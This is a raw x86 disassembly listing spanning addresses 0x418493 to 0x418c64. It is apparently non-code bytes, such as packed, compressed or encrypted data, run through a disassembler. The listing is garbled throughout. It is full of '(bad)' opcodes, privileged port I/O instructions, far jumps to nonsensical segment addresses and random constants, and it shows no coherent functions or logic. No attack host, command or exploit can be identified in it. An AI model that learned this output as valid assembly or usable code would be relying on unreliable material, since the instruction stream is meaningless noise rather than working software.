  418493:	les    edi,FWORD PTR [ecx+0x2a]
  418496:	(bad)  
  418497:	int3   
  418498:	out    dx,eax
  418499:	das    
  41849a:	adc    al,0xde
  41849c:	arpl   WORD PTR [esi-0x425fa285],di
  4184a2:	test   al,0x4e
  4184a4:	ins    BYTE PTR es:[edi],dx
  4184a5:	mov    dl,BYTE PTR [edx]
  4184a7:	mov    ebx,0x219f48bb
  4184ac:	loop   0x4184be
  4184ae:	xor    al,0x4d
  4184b0:	mov    DWORD PTR [esi+eiz*8-0x64ba0f58],0x417758a7
  4184bb:	mov    ebp,0x2c43d858
  4184c0:	ret    0xe010
  4184c3:	lea    edi,[edi]
  4184c5:	fsubr  st(3),st
  4184c7:	sar    BYTE PTR [ebx+0x72598a38],cl
  4184cd:	mov    WORD PTR [ebp-0x5c],ss
  4184d0:	xor    al,0x2c
  4184d2:	lea    edx,[eax-0x2f]
  4184d5:	rcr    BYTE PTR [edi-0x41da55f9],0x8e
  4184dc:	pop    ss
  4184dd:	push   es
  4184de:	push   ebx
  4184df:	mov    ebx,0x99967e0a
  4184e4:	test   eax,0xb46d6188
  4184e9:	inc    ebx
  4184ea:	cmp    ebx,DWORD PTR [esi-0x626b4e76]
  4184f0:	sar    BYTE PTR [esi],1
  4184f2:	cld    
  4184f3:	xchg   edx,eax
  4184f4:	out    0xbc,eax
  4184f6:	inc    ebx
  4184f7:	and    bl,BYTE PTR [esi+ecx*2-0x5c]
  4184fb:	and    al,0xcf
  4184fd:	out    0x98,eax
  4184ff:	subps  xmm6,XMMWORD PTR [eax+0x950007b]
  418506:	sub    ah,BYTE PTR [ebx]
  418508:	mov    ah,0x97
  41850a:	dec    ebp
  41850b:	(bad)  
  41850c:	sbb    eax,0xdeb248f5
  418511:	jbe    0x4184d7
  418513:	inc    ebp
  418514:	pop    ecx
  418515:	add    BYTE PTR [edx+0x48371d9b],dl
  41851b:	test   BYTE PTR [eax+0x275b4613],ch
  418521:	cld    
  418522:	jo     0x418512
  418524:	hlt    
  418525:	std    
  418526:	out    dx,eax
  418527:	xor    eax,0x9671d0c0
  41852c:	sbb    eax,0x4abe47dd
  418531:	xchg   esi,eax
  418532:	xor    ch,BYTE PTR [ecx]
  418534:	mov    edi,0x560d86c0
  418539:	xor    BYTE PTR [ebx+0x3e],0xa8
  41853d:	dec    eax
  41853e:	(bad)  
  41853f:	xor    al,cl
  418541:	pop    ebp
  418542:	or     eax,0xcf2d78f7
  418547:	mov    ds:0xe6e20200,eax
  41854c:	inc    ebp
  41854d:	xchg   edx,eax
  41854e:	scas   eax,DWORD PTR es:[edi]
  41854f:	cld    
  418550:	out    0xc0,eax
  418552:	adc    bl,BYTE PTR [edi-0x53]
  418555:	jmp    0x90d55426
  41855a:	(bad)  
  41855b:	push   edx
  41855c:	mov    ss,WORD PTR [edi]
  41855e:	je     0x418500
  418560:	pushf  
  418561:	call   0x92525327
  418566:	push   ebx
  418567:	and    al,0x28
  418569:	and    cl,BYTE PTR [ebx-0x16]
  41856c:	cmp    bh,BYTE PTR [eax+eiz*8+0x1044a594]
  418573:	into   
  418574:	daa    
  418575:	dec    edi
  418576:	lods   eax,DWORD PTR ds:[esi]
  418577:	mov    edi,0x2946ed33
  41857c:	cmp    DWORD PTR [ebx],0x7cf03b4c
  418582:	pop    ebp
  418583:	add    eax,0x2110f171
  418588:	jae    0x4185e6
  41858a:	ds sub esi,eax
  41858d:	jo     0x418566
  41858f:	pop    edi
  418590:	xor    DWORD PTR [edi-0x7f],edi
  418593:	fsubp  st(1),st
  418595:	lods   eax,DWORD PTR ds:[esi]
  418596:	loop   0x418592
  418598:	pusha  
  418599:	xor    eax,0x29e6da5e
  41859e:	gs pushaw 
  4185a1:	dec    eax
  4185a2:	loopne 0x418563
  4185a4:	mov    al,0xca
  4185a6:	jbe    0x4185b3
  4185a8:	aad    0xe2
  4185aa:	fwait
  4185ab:	sar    al,0x30
  4185ae:	and    al,0x75
  4185b0:	add    cl,0x67
  4185b3:	adc    DWORD PTR [esi+0x39],ecx
  4185b6:	dec    eax
  4185b7:	add    al,0xed
  4185b9:	push   0xdaad29b4
  4185be:	icebp  
  4185bf:	inc    esp
  4185c0:	sbb    bh,BYTE PTR [edx-0x32]
  4185c3:	pop    ebx
  4185c4:	outs   dx,BYTE PTR ds:[esi]
  4185c5:	sbb    edi,DWORD PTR [ecx]
  4185c7:	mov    dh,cl
  4185c9:	inc    edi
  4185ca:	pop    esp
  4185cb:	int    0x9c
  4185cd:	repz jecxz 0x418583
  4185d0:	shl    eax,0x3a
  4185d3:	mov    gs,WORD PTR ds:0x3a00d3f
  4185d9:	leave  
  4185da:	stos   BYTE PTR es:[edi],al
  4185db:	jno    0x418610
  4185dd:	int    0x45
  4185df:	sub    cl,BYTE PTR [edx+0x6bbe6c47]
  4185e5:	ret    
  4185e6:	aad    0xa
  4185e8:	in     al,dx
  4185e9:	jmp    0x6e3e:0x2e029ff9
  4185f0:	fdivr  QWORD PTR [ecx+edx*8]
  4185f3:	fadd   DWORD PTR [ebx+0x104a980f]
  4185f9:	xor    DWORD PTR [ebp-0x6e],esp
  4185fc:	cmc    
  4185fd:	pop    eax
  4185fe:	iret   
  4185ff:	(bad)  
  418600:	ins    DWORD PTR es:[edi],dx
  418601:	fs add ecx,eax
  418604:	inc    esi
  418605:	in     al,0x51
  418607:	shl    BYTE PTR [edi+0xb],cl
  41860a:	mov    ebp,0x816306b4
  41860f:	jbe    0x4185ed
  418611:	push   esi
  418612:	xchg   esp,eax
  418613:	adc    BYTE PTR [eax+0x13107898],ch
  418619:	and    eax,0x367a029
  41861e:	in     eax,dx
  41861f:	ds in  al,0x3d
  418622:	dec    ebp
  418623:	imul   esi,ebx,0x9e0555c0
  418629:	mov    ah,0x27
  41862b:	loop   0x41861d
  41862d:	xchg   ecx,eax
  41862e:	xlat   BYTE PTR ds:[ebx]
  41862f:	dec    ebp
  418630:	mov    eax,0x7f0f87bc
  418635:	jo     0x4185ff
  418637:	fdivr  DWORD PTR [esi+eiz*1]
  41863a:	adc    DWORD PTR [edx+0x25],eax
  41863d:	lea    ebx,[esi+ebx*1]
  418640:	lods   eax,DWORD PTR ds:[esi]
  418641:	mov    ebp,0x6cd1aa16
  418646:	or     eax,0x973736af
  41864b:	dec    edx
  41864c:	daa    
  41864d:	repnz mov cl,0xd5
  418650:	push   es
  418651:	sbb    DWORD PTR [si-0x35b7],ebx
  418656:	add    BYTE PTR [esp-0x7abf3585],0x56
  41865e:	cli    
  41865f:	sti    
  418660:	test   al,0x14
  418662:	push   ecx
  418663:	fst    QWORD PTR [ecx-0x5adc98cb]
  418669:	dec    ecx
  41866a:	das    
  41866b:	sub    bh,ah
  41866d:	fmul   st(6),st
  41866f:	dec    ecx
  418670:	out    0xd3,eax
  418672:	xor    bl,dl
  418674:	pop    ebx
  418675:	enter  0xfb5,0x2d
  418679:	call   0x59d6:0x579ea4a1
  418680:	les    ecx,FWORD PTR [eax-0x1bd257b0]
  418686:	outs   dx,DWORD PTR ds:[esi]
  418687:	push   cs
  418688:	or     ch,BYTE PTR [ebx+ecx*2+0xd]
  41868c:	mul    DWORD PTR [ecx-0xb]
  41868f:	arpl   WORD PTR [edi+0x2db0da80],ax
  418695:	pop    ebx
  418696:	sub    BYTE PTR [edx],al
  418698:	and    DWORD PTR [ecx-0x2a87a141],edi
  41869e:	dec    esi
  41869f:	lahf   
  4186a0:	mul    al
  4186a2:	retf   0x2cb2
  4186a5:	aaa    
  4186a6:	stos   WORD PTR es:[edi],ax
  4186a8:	xchg   esp,eax
  4186a9:	mov    ch,0xd6
  4186ab:	and    eax,0x219fe97e
  4186b0:	rcl    DWORD PTR [ecx+0x5d],cl
  4186b3:	inc    ebx
  4186b4:	pop    ecx
  4186b5:	cmp    eax,DWORD PTR [eax-0x4a]
  4186b8:	jmp    0x4440577f
  4186bd:	cld    
  4186be:	sub    BYTE PTR [edx],dh
  4186c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4186c1:	fdivr  QWORD PTR [esi-0x7eac16c0]
  4186c7:	and    al,bh
  4186c9:	lock std 
  4186cb:	in     eax,dx
  4186cc:	inc    edi
  4186cd:	clc    
  4186ce:	xor    al,0xd1
  4186d0:	fld    DWORD PTR [ebp+0x4b72443b]
  4186d6:	dec    esp
  4186d7:	sar    esi,1
  4186d9:	(bad)  
  4186da:	jg     0x4186fb
  4186dc:	arpl   WORD PTR [ecx],sp
  4186de:	jecxz  0x4186ab
  4186e0:	adc    al,0xe6
  4186e2:	aad    0xdf
  4186e4:	xchg   edx,eax
  4186e5:	enter  0x99ad,0x98
  4186e9:	jl     0x4186c6
  4186eb:	loope  0x418755
  4186ed:	pop    ecx
  4186ee:	mov    edi,DWORD PTR [ecx+esi*4-0x5b0d043b]
  4186f5:	vunpcklps ymm6,ymm3,YMMWORD PTR [edi+0x6ec0d22b]
  4186fd:	repz retf 0x9aba
  418701:	mov    ds,WORD PTR [ecx-0x1ec99b46]
  418707:	sub    al,0x42
  418709:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41870a:	lods   al,BYTE PTR ds:[esi]
  41870b:	cmc    
  41870c:	pop    ds
  41870d:	cli    
  41870e:	dec    edi
  41870f:	mov    al,ds:0xd52ee5b4
  418714:	outs   dx,BYTE PTR es:[esi]
  418716:	mov    eax,0x3215c95b
  41871b:	cmc    
  41871c:	adc    BYTE PTR [esp+esi*8+0x30],ah
  418720:	jmp    0xf790c4ae
  418725:	lds    ecx,FWORD PTR [ebp-0x2a7713c4]
  41872b:	daa    
  41872c:	popf   
  41872d:	int3   
  41872e:	outs   dx,BYTE PTR ds:[esi]
  41872f:	cld    
  418730:	mov    esp,0xdbc96700
  418735:	and    al,0x38
  418737:	mov    WORD PTR [edx+0x45dba2f4],?
  41873d:	enter  0xa21c,0x92
  418741:	jnp    0x41875f
  418743:	inc    ebp
  418744:	repz add edi,DWORD PTR [esp+edx*1+0x4434e2cd]
  41874c:	jmp    0xa4c61fa1
  418751:	shl    DWORD PTR [edi+eiz*4+0x4d],0xe1
  418756:	mov    bh,0xa3
  418758:	jp     0x41879f
  41875a:	sbb    ebx,eax
  41875c:	and    esp,ebp
  41875e:	ins    DWORD PTR es:[edi],dx
  41875f:	dec    esp
  418760:	cmp    DWORD PTR [ebp+0x351dcbb0],edi
  418766:	ret    0x51b8
  418769:	pop    ds
  41876a:	jg     0x41873b
  41876c:	mov    bl,BYTE PTR [ecx+0x7de9f6b2]
  418772:	test   BYTE PTR [edi],dl
  418774:	shl    DWORD PTR [edx+0x6672c4b1],0xf4
  41877b:	int3   
  41877c:	fcmovb st,st(3)
  41877e:	jo     0x4187c6
  418780:	push   ss
  418781:	or     ah,BYTE PTR [ecx+0x2]
  418784:	push   ds
  418785:	call   edx
  418787:	mov    edx,0xcca47c5b
  41878c:	push   esi
  41878d:	or     dl,BYTE PTR es:[ecx]
  418790:	mov    eax,ds:0xf6fa1bfb
  418795:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418796:	int    0xcb
  418798:	cmp    ebp,edx
  41879a:	add    al,0xd5
  41879c:	out    0xf3,eax
  41879e:	jns    0x41880d
  4187a0:	dec    esp
  4187a1:	dec    edi
  4187a2:	add    bl,bl
  4187a4:	shr    DWORD PTR [ebp+ebp*1-0x337ef193],1
  4187ab:	pop    esp
  4187ac:	loopne 0x41882a
  4187ae:	and    edx,DWORD PTR [ebx+0x48]
  4187b1:	aad    0xfc
  4187b3:	xchg   esp,eax
  4187b4:	adc    cl,BYTE PTR [ebx+0x4a]
  4187b7:	adc    DWORD PTR [ecx],eax
  4187b9:	hlt    
  4187ba:	xchg   BYTE PTR gs:[edi+0x7d1828bd],dl
  4187c1:	jp     0x418821
  4187c3:	or     BYTE PTR [esi],ah
  4187c5:	cld    
  4187c6:	xor    DWORD PTR [edx+0x6c59889e],edx
  4187cc:	icebp  
  4187cd:	loopne 0x41875e
  4187cf:	or     eax,0xfeaae4ee
  4187d4:	out    dx,al
  4187d5:	cmp    DWORD PTR [ecx],ecx
  4187d7:	mov    edx,DWORD PTR [esi+0x51]
  4187da:	cwde   
  4187db:	data16 and bh,BYTE PTR [ebx]
  4187de:	xchg   ebx,eax
  4187df:	pop    ebp
  4187e0:	or     al,BYTE PTR [eax+0x770adb5e]
  4187e6:	mov    ecx,0xb2749927
  4187eb:	inc    eax
  4187ec:	popf   
  4187ed:	fdiv   DWORD PTR [edi+ebx*8-0x72]
  4187f1:	sbb    DWORD PTR [ebp-0x22121632],edx
  4187f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4187f8:	sub    esi,DWORD PTR [ecx+0x9a7d4b3]
  4187fe:	mov    BYTE PTR [ecx+0x1a77298],bl
  418804:	jge    0x418786
  418806:	xor    al,0x3a
  418808:	scas   al,BYTE PTR es:[edi]
  418809:	js     0x4187be
  41880b:	call   0x257:0x3363ebdc
  418812:	test   edx,ebx
  418814:	int    0xd6
  418816:	cmp    DWORD PTR [edi-0x4c],eax
  418819:	pop    esp
  41881a:	jecxz  0x418873
  41881c:	and    BYTE PTR [ebp+edx*2-0x36aa6be2],bh
  418823:	sbb    DWORD PTR [ebx+edi*2-0x7501a7d8],esi
  41882a:	rol    ecx,cl
  41882c:	or     eax,0xa7af8aa0
  418831:	out    dx,al
  418832:	dec    ebx
  418833:	xchg   BYTE PTR [ebx+edx*1-0x49],dh
  418837:	rcl    DWORD PTR [edx+0x6cfddf3e],0x5d
  41883e:	jle    0x418881
  418840:	push   cs
  418841:	fs retf 0x19c6
  418845:	jb     0x41883f
  418847:	xchg   esi,eax
  418848:	xchg   esp,eax
  418849:	mov    ah,0xec
  41884b:	fldcw  WORD PTR [esi-0x72cb8c6a]
  418851:	imul   edi,edx,0x3d
  418854:	xor    DWORD PTR [edi-0x678540bc],0x3a
  41885b:	xor    DWORD PTR [ebp-0x388607fc],esi
  418861:	cmp    al,0xa5
  418863:	xchg   ebx,eax
  418864:	(bad)  
  418865:	pop    edx
  418866:	or     ebp,DWORD PTR [ebx]
  418868:	scas   al,BYTE PTR es:[edi]
  418869:	cmp    DWORD PTR [eax-0xc],ebx
  41886c:	push   cs
  41886d:	aaa    
  41886e:	bound  esp,QWORD PTR [ebp-0x23]
  418871:	cmp    eax,0x2b50935a
  418876:	xor    BYTE PTR ds:0x9ac971eb,cl
  41887c:	jp     0x4188ce
  41887e:	out    0xfb,al
  418880:	mov    al,ds:0x7ca15434
  418885:	aaa    
  418886:	jno    0x41884c
  418888:	jp     0x4188c7
  41888a:	dec    edi
  41888b:	sub    esp,DWORD PTR [ebp-0xb96f204]
  418891:	fucomp st(5)
  418893:	lea    eax,[eax+0x34]
  418896:	popf   
  418897:	daa    
  418898:	fadd   st(0),st
  41889a:	lods   eax,DWORD PTR ds:[esi]
  41889b:	sbb    eax,0xf72ea75f
  4188a0:	push   ss
  4188a1:	mov    al,0x33
  4188a3:	sub    ecx,DWORD PTR [ecx-0x3b]
  4188a6:	jnp    0x418841
  4188a8:	jmp    0x4188b6
  4188aa:	pop    esi
  4188ab:	dec    ecx
  4188ac:	inc    ecx
  4188ad:	pop    esi
  4188ae:	sti    
  4188af:	pop    ss
  4188b0:	mov    DWORD PTR [edi],eax
  4188b2:	and    DWORD PTR [ecx],eax
  4188b4:	shr    DWORD PTR [ebp-0x7bd7523c],cl
  4188ba:	repnz adc DWORD PTR [eax-0x50cb372b],ecx
  4188c1:	mov    edx,0x859821ea
  4188c6:	ficomp WORD PTR [edx+edi*8]
  4188c9:	(bad)  
  4188ca:	out    dx,al
  4188cb:	dec    eax
  4188cc:	push   0x45f48ed5
  4188d1:	(bad)  
  4188d2:	cmp    dl,bl
  4188d4:	loop   0x418941
  4188d6:	and    edx,DWORD PTR [ebp-0x44bc61e]
  4188dc:	mov    bh,0x8c
  4188de:	jmp    0xb721e069
  4188e3:	adc    al,0xb7
  4188e5:	fcom   QWORD PTR [ecx-0x51]
  4188e8:	std    
  4188e9:	fucom  st(5)
  4188eb:	(bad)  
  4188ec:	(bad)  
  4188ed:	in     al,dx
  4188ee:	stc    
  4188ef:	pop    ebx
  4188f0:	test   BYTE PTR [edx+0x67335d3],ah
  4188f6:	test   ebp,0x609d3f1c
  4188fc:	sti    
  4188fd:	or     BYTE PTR ds:0xeb52d182,bl
  418903:	xchg   ebx,eax
  418904:	rol    DWORD PTR [eax+eax*1],0x5a
  418908:	mov    edx,0x5ef0d8d2
  41890d:	pop    ebp
  41890e:	aas    
  41890f:	out    dx,al
  418910:	fnstcw WORD PTR [edx]
  418912:	mov    DWORD PTR [edx],0xcbe507a3
  418918:	cmp    BYTE PTR [edx-0x12],0x6f
  41891c:	inc    esp
  41891d:	sbb    esi,DWORD PTR [edi-0x3b8f3756]
  418923:	lahf   
  418924:	mov    ds:0x72a194e6,eax
  418929:	loopne 0x4188b4
  41892b:	inc    ebp
  41892c:	fisubr WORD PTR [ebp*4+0x3a6c3664]
  418933:	inc    ebp
  418934:	sub    BYTE PTR [esi+edi*4],bh
  418937:	mov    ebx,0x61aa293e
  41893c:	cld    
  41893d:	lods   eax,DWORD PTR ds:[esi]
  41893e:	sar    DWORD PTR [edi-0x35],1
  418941:	es clc 
  418943:	lods   eax,DWORD PTR ds:[esi]
  418944:	fdivr  DWORD PTR [edx]
  418946:	xchg   ebx,eax
  418947:	and    al,0x6e
  418949:	or     al,bl
  41894b:	dec    ebp
  41894c:	cmp    eax,0xad2e5029
  418951:	sub    BYTE PTR [esi+edx*8],dh
  418954:	call   0x64502675
  418959:	sub    eax,0xe0ae19c
  41895e:	stos   BYTE PTR es:[edi],al
  41895f:	test   BYTE PTR [eax],cl
  418961:	in     al,dx
  418962:	lods   eax,DWORD PTR ds:[esi]
  418963:	jno    0x41895b
  418965:	das    
  418966:	cdq    
  418967:	mov    al,0xc0
  418969:	dec    edx
  41896a:	mov    edx,0xd18bcb11
  41896f:	retf   
  418970:	arpl   WORD PTR [edx],di
  418972:	push   esi
  418973:	mov    ds:0xb570e411,eax
  418978:	ins    BYTE PTR es:[edi],dx
  418979:	xor    dh,BYTE PTR [ecx-0x4]
  41897c:	sbb    ebx,ebx
  41897e:	dec    eax
  41897f:	or     DWORD PTR [esi-0x6d],edx
  418982:	and    eax,0x1cbb699e
  418987:	push   edx
  418988:	ins    DWORD PTR es:[edi],dx
  418989:	xchg   ecx,eax
  41898a:	rcl    DWORD PTR [edx*2+0x34d85926],1
  418991:	loop   0x41898d
  418993:	repz push esp
  418995:	ret    
  418996:	or     eax,0x66e1ea8a
  41899b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41899c:	pop    edi
  41899d:	mov    ch,0x9e
  41899f:	out    dx,eax
  4189a0:	jae    0x4189a7
  4189a2:	cdq    
  4189a3:	daa    
  4189a4:	and    DWORD PTR [ecx],ebx
  4189a6:	push   edx
  4189a7:	pop    ecx
  4189a8:	jo     0x4189bf
  4189aa:	ja     0x418a1c
  4189ac:	push   0xffffff9d
  4189ae:	jb     0x418960
  4189b0:	fxch   st(7)
  4189b2:	or     al,0x30
  4189b4:	dec    ebp
  4189b5:	and    edx,DWORD PTR [eax]
  4189b7:	mov    al,ds:0x3e298684
  4189bc:	scas   al,BYTE PTR es:[edi]
  4189bd:	add    eax,0x183ae6fa
  4189c2:	rcl    DWORD PTR [edi-0x7e84884],1
  4189c8:	mov    DWORD PTR [eax],esp
  4189ca:	out    0x79,eax
  4189cc:	sbb    eax,esp
  4189ce:	or     dh,BYTE PTR [edi]
  4189d0:	xchg   eax,edi
  4189d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4189d3:	push   ss
  4189d4:	stc    
  4189d5:	sbb    al,0xee
  4189d7:	mov    eax,0x6a8bdd0
  4189dc:	inc    edi
  4189dd:	dec    ecx
  4189de:	in     al,0x9d
  4189e0:	bnd jnp 0x418a61
  4189e3:	cli    
  4189e4:	inc    edx
  4189e5:	adc    ch,BYTE PTR [esi]
  4189e7:	xchg   ebx,eax
  4189e8:	push   esi
  4189e9:	pop    edx
  4189ea:	mov    dh,0xc0
  4189ec:	push   0x3c
  4189ee:	dec    edx
  4189ef:	mov    al,0xc2
  4189f1:	push   eax
  4189f2:	inc    ebp
  4189f3:	push   edi
  4189f4:	lds    edx,FWORD PTR [esi+0x417fa76d]
  4189fa:	mov    dl,0x47
  4189fc:	loop   0x418993
  4189fe:	or     BYTE PTR ds:0x853b8cc6,0x6c
  418a05:	dec    eax
  418a06:	cmp    dl,BYTE PTR [edi]
  418a08:	xor    BYTE PTR [esi],0x89
  418a0b:	adc    ebx,eax
  418a0d:	dec    ebp
  418a0e:	inc    DWORD PTR [ebp+0x24]
  418a11:	mov    ecx,0x72bbfe20
  418a16:	arpl   WORD PTR [edx-0x7f9778cb],cx
  418a1c:	mov    al,0xa4
  418a1e:	ds stos DWORD PTR es:[edi],eax
  418a20:	sub    DWORD PTR ds:0xd2eb40a8,esp
  418a26:	xchg   ecx,eax
  418a27:	shr    DWORD PTR [edx+edi*4-0x6cb94997],0x31
  418a2f:	inc    edx
  418a30:	xchg   ebx,eax
  418a31:	push   ecx
  418a32:	adc    eax,0x2f2da1fa
  418a37:	ins    BYTE PTR es:[edi],dx
  418a38:	cs std 
  418a3a:	lods   eax,DWORD PTR ds:[esi]
  418a3b:	jne    0x418a99
  418a3d:	ds ret 0x85e6
  418a41:	rcl    DWORD PTR [eax],cl
  418a43:	sub    DWORD PTR [esi],esi
  418a45:	jae    0x4189d8
  418a47:	out    0x21,eax
  418a49:	mov    ds:0x87b04d17,al
  418a4e:	ds inc ecx
  418a50:	jge    0x418aaf
  418a52:	scas   eax,DWORD PTR es:[edi]
  418a53:	add    DWORD PTR [edi+0x642ae464],ebp
  418a59:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418a5a:	call   0x710:0x3d24bb0
  418a61:	sub    BYTE PTR [edx+0x45e1d024],0xb1
  418a68:	daa    
  418a69:	and    ecx,esi
  418a6b:	push   ebp
  418a6c:	test   BYTE PTR [ecx+esi*4-0x55e9d4ad],bl
  418a73:	out    dx,al
  418a74:	jbe    0x418a07
  418a76:	xor    DWORD PTR [esi],0x45
  418a79:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418a7a:	push   esi
  418a7b:	arpl   WORD PTR [edx-0x168f62b6],ax
  418a81:	mov    ds:0xe8d9b4ac,eax
  418a86:	pop    ds
  418a87:	push   edx
  418a88:	and    eax,0xbc43a691
  418a8d:	jmp    0xdf45:0x55913c7
  418a94:	inc    BYTE PTR [esp+ecx*4]
  418a97:	mov    ebp,0x6492dd80
  418a9c:	repz cli 
  418a9e:	cld    
  418a9f:	in     al,0x29
  418aa1:	mov    ebp,eax
  418aa3:	shl    ch,0xef
  418aa6:	call   DWORD PTR [edi]
  418aa8:	mov    al,0xab
  418aaa:	(bad)  
  418aab:	ss (bad) 
  418aad:	int3   
  418aae:	loop   0x418a92
  418ab0:	cs pop ss
  418ab2:	call   DWORD PTR [eax+0x29]
  418ab5:	rol    DWORD PTR [edi],0x83
  418ab8:	dec    eax
  418ab9:	icebp  
  418aba:	xchg   edx,eax
  418abb:	jno    0x418ac5
  418abd:	push   ecx
  418abe:	pop    esi
  418abf:	xor    al,0xa9
  418ac1:	nop
  418ac2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418ac3:	gs mov dh,0xa0
  418ac6:	sub    BYTE PTR [ebx],ah
  418ac8:	and    DWORD PTR [esi-0x2f9dfe4f],esi
  418ace:	push   ebp
  418acf:	dec    ecx
  418ad0:	fisub  WORD PTR [eax]
  418ad2:	mov    bl,0x8e
  418ad4:	dec    esi
  418ad5:	test   al,0x85
  418ad7:	fimul  WORD PTR [edx+0x1a]
  418ada:	adc    DWORD PTR [eax],ecx
  418adc:	push   esp
  418add:	push   esp
  418ade:	sub    BYTE PTR [edi+0x7f20bfd],dl
  418ae4:	repz stc 
  418ae6:	in     al,0xa1
  418ae8:	shl    DWORD PTR [ebx],1
  418aea:	leave  
  418aeb:	push   eax
  418aec:	fwait
  418aed:	mov    eax,0x2b6ff01a
  418af2:	shl    BYTE PTR [ebx+0x575247e5],0x23
  418af9:	mov    eax,0x1684f88b
  418afe:	retf   0xe595
  418b01:	mov    esp,0x4cfba2c3
  418b06:	ret    0xa807
  418b09:	(bad)  
  418b0a:	ja     0x418af5
  418b0c:	loop   0x418ab4
  418b0e:	mov    bh,BYTE PTR [edx-0x2c]
  418b11:	push   edi
  418b12:	pop    esi
  418b13:	daa    
  418b14:	xchg   BYTE PTR [eax],cl
  418b16:	call   0xb33049c0
  418b1b:	pop    edx
  418b1c:	dec    eax
  418b1d:	sub    BYTE PTR [esi],0xbc
  418b20:	jl     0x418b5b
  418b22:	jmp    0x6adf:0xe6aed3d4
  418b29:	mov    BYTE PTR [edx+0x44],dh
  418b2c:	inc    esi
  418b2d:	out    0xca,eax
  418b2f:	cmp    BYTE PTR [edi],cl
  418b31:	sub    BYTE PTR [ecx*2+0x60a40a67],dl
  418b38:	mov    ch,0xce
  418b3a:	adc    edi,0x189224ae
  418b40:	mov    bh,BYTE PTR [edi]
  418b42:	mov    edx,0x915f53c1
  418b47:	lds    esi,FWORD PTR [edi]
  418b49:	call   edx
  418b4b:	mov    al,0x84
  418b4d:	dec    eax
  418b4e:	sub    BYTE PTR [esp+esi*4+0x461f7ed8],0x96
  418b56:	jge    0x418b6e
  418b58:	jnp    0x418b87
  418b5a:	lock pop edi
  418b5c:	and    BYTE PTR [edi+0x73],bh
  418b5f:	fldenv [edi]
  418b61:	scas   eax,DWORD PTR es:[edi]
  418b62:	loop   0x418b1e
  418b64:	je     0x418b86
  418b66:	cmp    eax,0xd2c6142
  418b6b:	add    al,0x2f
  418b6d:	into   
  418b6e:	call   FWORD PTR [esp+esi*8+0x27]
  418b72:	cdq    
  418b73:	mov    ah,0xb4
  418b75:	sub    edx,edi
  418b77:	outs   dx,BYTE PTR ds:[esi]
  418b78:	push   es
  418b79:	jecxz  0x418bb9
  418b7b:	push   es
  418b7c:	into   
  418b7d:	addr16 test eax,0x36ac4bb1
  418b83:	sbb    BYTE PTR [eax-0x8],bh
  418b86:	test   eax,0x6aaaf80e
  418b8b:	cs pop ss
  418b8d:	xchg   DWORD PTR [ebx-0xc6cbe02],ebx
  418b93:	adc    eax,0x8133b937
  418b98:	push   0xfffffffe
  418b9a:	stos   DWORD PTR es:[edi],eax
  418b9b:	and    al,0xff
  418b9d:	xor    DWORD PTR [ecx+0x51],ecx
  418ba0:	scas   al,BYTE PTR es:[edi]
  418ba1:	sub    eax,0xab4e8695
  418ba6:	and    esi,ecx
  418ba8:	retf   
  418ba9:	addr16 cli 
  418bab:	(bad)  
  418bac:	xor    al,0x40
  418bae:	cmp    BYTE PTR [ecx],cl
  418bb0:	(bad)  [ebp+0x24b34eb4]
  418bb6:	idiv   ah
  418bb8:	fcmovb st,st(1)
  418bba:	sti    
  418bbb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418bbc:	in     al,dx
  418bbd:	push   ds
  418bbe:	shl    BYTE PTR [esi],0x21
  418bc1:	das    
  418bc2:	xor    bl,BYTE PTR [ecx]
  418bc4:	outs   dx,BYTE PTR ds:[esi]
  418bc5:	ins    BYTE PTR es:[edi],dx
  418bc6:	or     ebp,DWORD PTR [edi]
  418bc8:	sahf   
  418bc9:	xchg   edi,eax
  418bca:	fldenv [ecx-0x29cb8221]
  418bd0:	repz pop es
  418bd2:	and    esi,DWORD PTR [edi]
  418bd4:	dec    esp
  418bd5:	xor    BYTE PTR [edi+0x1c],dl
  418bd8:	in     al,dx
  418bd9:	sbb    ch,BYTE PTR [ebx-0x6b]
  418bdc:	xor    eax,0xefa240ce
  418be1:	mov    cl,0x7f
  418be3:	push   0xe4f06dd6
  418be8:	add    al,0xfc
  418bea:	fbld   TBYTE PTR [eax-0x5d]
  418bed:	jb     0x418c31
  418bef:	push   0x2b
  418bf1:	add    edi,DWORD PTR [esi]
  418bf3:	and    eax,0x1ae31720
  418bf8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418bf9:	add    eax,0xe0adf58c
  418bfe:	pop    esi
  418bff:	icebp  
  418c00:	ins    DWORD PTR es:[edi],dx
  418c01:	pop    ebp
  418c02:	fisub  DWORD PTR [ecx+0x58]
  418c05:	or     dh,bl
  418c07:	call   0x7da5616b
  418c0c:	mov    al,0x2d
  418c0e:	pop    es
  418c0f:	sysexit 
  418c11:	icebp  
  418c12:	dec    edi
  418c14:	retf   
  418c15:	cmp    ebx,0x69
  418c18:	and    dl,BYTE PTR [esi]
  418c1a:	inc    edi
  418c1b:	stc    
  418c1c:	jmp    0x418c02
  418c1e:	retf   0x948a
  418c21:	stc    
  418c22:	emms   
  418c24:	cmp    DWORD PTR [edi+0x20280154],0xffffffb9
  418c2b:	outs   dx,BYTE PTR ds:[esi]
  418c2c:	jb     0x418c6f
  418c2e:	mov    ecx,esp
  418c30:	jne    0x418c5a
  418c32:	int    0xe2
  418c34:	cmc    
  418c35:	jl     0x418ca6
  418c37:	mov    ah,0x16
  418c39:	xchg   esi,eax
  418c3a:	ud1    esp,DWORD PTR [edi+0x2b]
  418c3e:	xchg   ecx,eax
  418c3f:	xor    ch,dh
  418c41:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418c42:	or     al,0xef
  418c44:	mov    edi,0xb5d466d3
  418c49:	pushf  
  418c4a:	sub    BYTE PTR [edx+edi*2+0x30150d8d],0xda
  418c52:	test   esp,esi
  418c54:	jbe    0x418c67
  418c56:	repz mov dh,0xd3
  418c59:	mov    edx,0xa9f06330
  418c5e:	mov    eax,0xda29fc34
  418c63:	inc    ebp
  418c64:	sub    BYTE PTR [edi],bh
